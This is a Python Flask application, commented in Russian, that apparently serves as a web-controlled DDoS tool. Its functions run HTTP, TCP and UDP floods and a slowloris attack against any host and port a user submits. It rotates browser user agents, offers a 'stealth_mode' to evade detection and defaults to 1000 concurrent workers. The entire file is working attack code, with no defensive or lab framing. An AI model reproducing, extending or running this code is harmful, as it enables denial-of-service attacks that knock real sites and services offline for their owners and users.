from flask import Flask, request, jsonify, render_template
import asyncio
import aiohttp
import random
import time
import socket
import threading
from urllib.parse import urlparse

app = Flask(__name__)

# Конфигурация
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59"
]

# Глобальные переменные
attack_active = False
attack_thread = None
attack_stats = {
    "requests": 0,
    "success": 0,
    "failed": 0,
    "start_time": 0
}

# Функции атак
async def http_flood(target, port, stealth_mode):
    global attack_stats
    try:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        if stealth_mode:
            await asyncio.sleep(random.uniform(0.1, 0.3))
        async with aiohttp.ClientSession() as session:
            url = f"https://{target}:{port}" if port == 443 else f"http://{target}:{port}"
            try:
                async with session.get(url, headers=headers, timeout=5, ssl=(port == 443)) as response:
                    attack_stats["success"] += 1
                    attack_stats["requests"] += 1
                    return "Success"
            except Exception as e:
                attack_stats["failed"] += 1
                attack_stats["requests"] += 1
                return f"Failed: {str(e)}"
    except Exception as e:
        attack_stats["failed"] += 1
        attack_stats["requests"] += 1
        return f"Failed: {str(e)}"

def tcp_flood(target, port):
    global attack_stats
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((target, port))
        data = random._urandom(1024)
        sock.send(data)
        sock.close()
        attack_stats["success"] += 1
        attack_stats["requests"] += 1
        return "Success"
    except Exception as e:
        attack_stats["failed"] += 1
        attack_stats["requests"] += 1
        return f"Failed: {str(e)}"

def udp_flood(target, port):
    global attack_stats
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1024)
        sock.sendto(data, (target, port))
        sock.close()
        attack_stats["success"] += 1
        attack_stats["requests"] += 1
        return "Success"
    except Exception as e:
        attack_stats["failed"] += 1
        attack_stats["requests"] += 1
        return f"Failed: {str(e)}"

async def slowloris(target, port, stealth_mode):
    global attack_stats
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target, port))
        sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
        sock.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
        sock.send(b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
        while attack_active:
            try:
                if stealth_mode:
                    await asyncio.sleep(random.uniform(1, 3))
                sock.send(b"X-a: b\r\n")
                attack_stats["success"] += 1
                attack_stats["requests"] += 1
                await asyncio.sleep(1)
            except:
                attack_stats["failed"] += 1
                attack_stats["requests"] += 1
                break
        sock.close()
        return "Success"
    except Exception as e:
        attack_stats["failed"] += 1
        attack_stats["requests"] += 1
        return f"Failed: {str(e)}"

async def run_attack(target, port, attack_type, threads, duration, stealth_mode):
    global attack_active, attack_stats
    attack_stats = {
        "requests": 0,
        "success": 0,
        "failed": 0,
        "start_time": time.time()
    }
    attack_active = True
    async def worker():
        while attack_active:
            if attack_type == "http":
                await http_flood(target, port, stealth_mode)
            elif attack_type == "tcp":
                tcp_flood(target, port)
            elif attack_type == "udp":
                udp_flood(target, port)
            elif attack_type == "slow":
                await slowloris(target, port, stealth_mode)
            if duration > 0 and time.time() - attack_stats["start_time"] >= duration:
                break
    tasks = [worker() for _ in range(threads)]
    await asyncio.gather(*tasks)
    attack_active = False

def start_attack_thread(target, port, attack_type, threads, duration, stealth_mode):
    global attack_thread, attack_active
    if attack_active:
        return False
    attack_active = True
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_attack(target, port, attack_type, threads, duration, stealth_mode))
    loop.close()
    attack_active = False
    return True

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/attack", methods=["POST"])
def handle_attack():
    global attack_active, attack_thread
    data = request.get_json()
    action = data.get("action")
    
    if action == "start":
        if not attack_active:
            target = data.get("target")
            if target.startswith("http://") or target.startswith("https://"):
                target = urlparse(target).hostname
            port = data.get("port", 80)
            attack_type = data.get("attack_type", "http")
            threads = data.get("threads", 1000)
            duration = data.get("duration", 0)
            stealth_mode = data.get("stealth_mode", False)
            
            attack_thread = threading.Thread(
                target=start_attack_thread,
                args=(target, port, attack_type, threads, duration, stealth_mode)
            )
            attack_thread.start()
            return jsonify({"status": "started"})
        return jsonify({"status": "already_running"})
    
    elif action == "stop":
        attack_active = False
        if attack_thread:
            attack_thread.join()
        return jsonify({"status": "stopped"})
    
    return jsonify({"status": "invalid_action"})

@app.route("/api/stats")
def get_stats():
    global attack_stats
    if attack_stats["requests"] > 0:
        return jsonify({
            "requests": attack_stats["requests"],
            "success": attack_stats["success"],
            "failed": attack_stats["failed"],
            "time": round(time.time() - attack_stats["start_time"], 2),
            "success_percentage": min(100, (attack_stats["success"] / attack_stats["requests"] * 100) if attack_stats["requests"] > 0 else 0)
        })
    return jsonify({
        "requests": 0,
        "success": 0,
        "failed": 0,
        "time": 0,
        "success_percentage": 0
    })

if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=5000)